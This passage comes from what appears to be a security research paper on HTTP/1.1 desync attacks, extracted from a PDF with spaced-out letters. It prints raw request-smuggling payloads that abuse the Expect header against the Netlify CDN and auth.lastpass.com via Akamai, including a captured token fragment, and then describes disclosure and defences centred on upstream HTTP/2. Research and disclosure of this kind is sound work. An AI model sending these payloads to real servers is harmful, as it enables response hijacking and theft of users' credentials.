1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 H o s t : h 1 . s e c . g i t l a b . n e t H T T P / 1 . 1 3 0 2 F o u n d L o c a t i o n : h t t p s : / / s t o r a g e < r e d a c t e d > C L.0 desyn c via van illa Exp ect - Netlify C D N Proving that it can break servers in every possible way , Expect can also cause CL.0 desync vulnerabilities. For example, we found a CL.0 RQP vulnerability in Netlify that, when triggered, send us a continuous stream of responses from every website on the Netlify CDN: P O S T / i m a g e s / H T T P / 1 . 1 H o s t : < r e d a c t e d - n e t l i f y - c l i e n t > E x p e c t : 1 0 0 - c o n t i n u e C o n t e n t - L e n g t h : 6 4 G E T / l e t t e r - p i c k e r H T T P / 1 . 1 H o s t : < r e d a c t e d - n e t l i f y - c l i e n t > H T T P / 1 . 1 4 0 4 N o t F o u n d P O S T / a u t h e n t i c a t e H T T P / 1 . 1 H o s t : ? ? ? U s e r - A g e n t : U n k n o w n N e t l i f y u s e r H T T P / 1 . 1 2 0 0 O K …< t i t l e > L e t t e r P i c k e r W h e e l G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d - n e t l i f y - c l i e n t > H T T P / 1 . 1 2 0 0 O K …\" { \\ \" t o k e n \\ \" : \\ \" e y J h b G c i O i J … We found this while testing a particular Netlify-hosted website, but it didn't make sense to report it to them as the responses we hijacked were all coming from third-party websites. The attack stopped working shortly after we found it, but we reported it to Netlify anyway and received the reply \"W ebsites utilizing Netlify are out of scope\", and no bounty . Normally, when I encounter a surprising bounty outcome, I don’t mention it as it tends to distract readers from the technical content. I’ve made an exception here because it provides useful context for what happened next. C L.0 desyn c via o bfuscated Exp ect - A kamai C D N Unsurprisingly, obfuscating the Expect header revealed even more CL.0 desync vulnerabilities. Here's an example we found that let us serve arbitrary content to users accessing auth.lastpass.com, netting their maximum bounty - $5,000: O P T I O N S / a n y t h i n g H T T P / 1 . 1 H o s t : a u t h . l a s t p a s s . c o m E x p e c t : 1 0 0 - c o n t i n u e C o n t e n t - L e n g t h : 3 9 G E T / H T T P / 1 . 1 H o s t : w w w . s k y . c o m X : X H T T P / 1 . 1 4 0 4 N o t F o u n d G E T / a n y t h i n g H T T P / 1 . 1 H o s t : a u t h . l a s t p a s s . c o m H T T P / 1 . 1 2 0 0 O K D i s c o v e r T V & B r o a d b a n d P a c k a g e s w i t h S k y We quickly realised this af fected a large number of targets using the Akamai CDN. In fact, I believe we could have used it to take control of possibly the most prestigious domain on the internet - example.com! Unfortunately , example.com doesn't have a VDP , so validating this would have been illegal. Unless Akamai informs us, we'll probably never know for certain. Still, this raised a question. Should we report the issue directly to af fected companies, or to Akamai? As a researcher , maintaining a good relationship with both CDNs and their customers is really important, and any bounties I earn go to charity so I don't have a personal stake. However , I could see that the bounty hunters would have discovered the issue independently without my help, and didn't want to sabotage their income. Ultimately , I decided to step back - I didn't get involved in exploring or reporting the issue, and didn't take a cut of the bounties. Part of me regrets this a little because it ultimately resulted in 74 separate bounties, totalling $221,000. The reports were well received, but things didn't go entirely smoothly . It transpired that the vulnerability was actually fully inside Akamai's infrastructure, so Akamai was inundated with support tickets from their clients. I became concerned that the technique might leak while Akamai was still vulnerable, and reached out to Akamai to help them ﬁx it faster . The issue was assigned CVE- 2025-32094, and I was awarded a $9,000 bounty . They were able to release a hotﬁx for some customers quickly, but it still took 65 days from that point to fully resolve the vulnerability . Overall, it was quite stressful, but at least I got some USD-backed evidence of the danger posed by HTTP/1.1. The total bounties earned from this research so far currently stands at roughly $276,000. D efen din g again st HTTP desyn c attacks Why p atchin g HTTP/1 .1 is n o t en o ugh All the attacks in this paper are exploiting implementation ﬂaws, so it might seem strange to conclude that the solution is to abandon the entire protocol. However , all these attacks have the same root cause. HTTP/1.1's fatal ﬂaw - poor request separation - means tiny bugs often have critical impact. This is compounded by two key factors. First, HTTP/1.1 is only simple if you're not proxying. The RFC contains numerous landmines like the three dif ferent ways of specifying the length of a message, complexity bombs like Expect and Connection, and special-cases like HEAD. These all interact with each-other , and parser discrepancies, to create countless critical vulnerabilities. Second, the last six years have proven that we struggle to apply the types of patching and hardening that would truly resolve the threat. Applying robust validation or normalisation on front- end servers would help, but we're too afraid of breaking compatibility with legacy clients to do this. Instead, we resort to regex-based defences, which attackers can easily bypass. All these factors combine to mean one thing - more desync attacks are coming. Ho w secure is HTTP/2 co mp ared to HTTP/1 ? HTTP/2 is not perfect - it's signiﬁcantly more complex than HTTP/1, and can be painful to implement. However , upstream HTTP/2+ makes desync vulnerabilities vastly less likely . This is because HTTP/2 is a binary protocol, much like TCP and TLS, with zero ambiguity about the length of each message. You can expect implementation bugs, but the probability that a given bug is actually exploitable is signiﬁcantly lower . Most vulnerabilities found in HTTP/2 implementations to date are DoS ﬂaws such as HTTP/2 Rapid Reset 3 3 - an attack class that HTTP/1 has its fair share of. For a more serious vulnerability , you would typically need a memory safety issue or integer overﬂow as a root cause. Once again, these issues affect HTTP/1.1 implementations too. Of course, there's always exceptions - like CVE-2023- 32731 3 4 and HTTP/3 connection contamination 3 5 - and I look forward to seeing more research targeting these in the future. Note that HTTP/2 downgrading, where front-end servers speak HTTP/2 with clients but rewrite it as HTTP/1.1 for upstream communication, provides minimal security beneﬁt and actually makes websites more exposed to desync attacks. You might encounter an argument stating that HTTP/1.1 is more secure than HTTP/2 because HTTP/1.1 implementations are older , and therefore more hardened. To counter this, I would like to draw a comparison between request smuggling, and buf fer overﬂows. Request smuggling has been a well known threat for roughly six years. This means our defences against it are roughly as mature as our defences against buf fer overﬂows were in 2002. It's time to switch to a memory safe language. Ho w to defeat req uest smugglin g with HTTP/2 First, ensure your origin server supports HTTP/2. Most modern servers do, so this shouldn't be a problem. Next, toggle upstream HTTP/2 on your proxies. I've conﬁrmed this is possible on the following vendors: HAProxy, F5 Big-IP, Google Cloud, Imperva, Apache (experimental), and Cloudﬂare (but they use HTTP/1 internally). Unfortunately , the following vendors have not yet added support for upstream HTTP/2: nginx, Akamai, CloudFront, Fastly . Try raising a support ticket asking when they'll enable upstream HTTP/2 - hopefully they can at least provide a timeline. Also, have a look through their documentation to see if you can enable request normalisation - sometimes valuable mitigations are available but disabled by default. Note that disabling HTTP/1 between the browser and the front-end is not required. These connections are rarely shared between dif ferent users and, as a result, they're signiﬁcantly less dangerous. Just ensure they're converted to HTTP/2 upstream. Ho w to survive with HTTP/1 .1 If you're currently stuck with upstream HTTP/1.1, there are some strategies you can use to try and help your website survive the inevitable future rounds of desync attacks until you can start using HTTP/2. Enable all available normalization and validation options on the front-end server Enable validation options on the back-end server Avoid niche webservers - Apache and nginx are lower-risk Perform regular scans with HTTP Request Smuggler Disable upstream connection reuse (may impact performance) Reject requests that have a body , if the method doesn't require one to be present (GET/HEAD/OPTIONS) Finally, please be wary of vendor claims that W AFs can thwart desync attacks as ef fectively as upstream HTTP/2. Ho w yo u can help kill HTTP/1 .1 Right now, the biggest barrier to killing upstream HTTP/1 is poor awareness of how dangerous it is. Hopefully this research will help a bit, but to make a lasting dif ference and ensure we're not in exactly the same place in six years time, I need your help. We need to collectively show the world how broken HTTP/1.1 is. Take HTTP Request Smuggler 3.0 for a spin, hack systems and get them patched with HTTP/2. Whenever possible, publish your ﬁndings so the rest of us can learn from it. Don't let targets escape you just by patching the methodology - adapt and customise techniques and tools, and never settle for the state of the art. It's not as hard as you think, and you deﬁnitely don't need years of research experience. For example, while wrapping this research up I realised a writeup published last year actually describes an Expect-based 0.CL desync 3 6 , so you could have beaten me to these ﬁndings just by reading and applying that! Finally, share the message - more desync attacks are always coming. C o n clusio n Over the last six years, we've seen that a design ﬂaw in HTTP/1.1 regularly exposes websites to critical attacks. Attempts to hotﬁx individual implementations have failed to keep pace with the threat, and the only viable long-term solution is upstream HTTP/2. This is not a quick ﬁx, but by spreading awareness just how dangerous upstream HTTP/1.1 really is, we can help kill HTTP/1.1. Good luck! James Kettle PortSwigger Research Referen ces 1. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#paypal 2. https://portswigger.net/web-security/request-smuggling 3. https://portswigger.net/research/request-smuggling 4. https://www.linkedin.com/in/wannes-verwimp/ 5. https://blog.cloudﬂare.com/resolving-a-request-smuggling-vulnerability-in-pingora/ 6. https://www.42ndstreet.org.uk/ 7. https://www.youtube.com/watch?v=RAtpG6OYYNM 8. https://github.com/PortSwigger/http-request-smuggler/ 9. https://datatracker.ietf.org/doc/html/rfc91 12#section-2.2 10. https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load- balancers.html#desync-mitigation-mode 11. https://assured.se/posts/the-single-packet-shovel-desync-powered-request-tunnelling 12. https://portswigger.net/research/http-desync-attacks-request-smuggling- reborn#explore 13. https://portswigger.net/research/the-single-packet-attack-making-remote-race- conditions-local 14. https://learn.microsoft.com/en-us/windows/win32/ﬁleio/naming-a-ﬁle 15. https://github.com/PortSwigger/http-request- smuggler/blob/a05163d42989c07f f24bcd9e81e6e2d3c70ec966/src/burp/ImplicitZeroS can.java#L137 16. https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples/0cl-ﬁnd- offset.py 17. https://portswigger.net/web-security/request-smuggling/advanced/lab-request- smuggling-0cl-request-smuggling 18. https://hackerone.com/exness?type=team 19. https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf 20. https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/ DEF%20CON%2024%20-%20Regilero-Hiding-W ookiees-In-Http.pdf 21. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 22. https://portswigger.net/research/http2 23. https://portswigger.net/research/browser-powered-desync-attacks 24. https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a- critical-vulnerability-in-thousands-of-google-cloud-websites/ 25. https://w4ke.info/2025/06/18/funky-chunks.html 26. https://github.com/PortSwigger/http-request- smuggler/blame/a07da1292dcaaaefbebbc79b764e576962fedf3c/src/burp/DesyncBox. java#L422 27. https://x.com/sw33tLie 28. https://x.com/bsysop 29. https://www.linkedin.com/in/francesco-mariani-85841b1b3 30. https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a- critical-vulnerability-in-thousands-of-google-cloud-websites/ 31. https://portswigger.net/research/top-10-web-hacking-techniques-of-2024 32. https://bugcrowd.com/engagements/t-mobile 33. https://blog.cloudﬂare.com/technical-breakdown-http2-rapid-reset-ddos-attack/ 34. https://nvd.nist.gov/vuln/detail/cve-2023-32731 35. https://portswigger.net/research/http-3-connection-contamination 36. https://mattermost.com/blog/a-dos-bug-thats-worse-than-it-seems/","libVersion":"0.5.0","langs":""}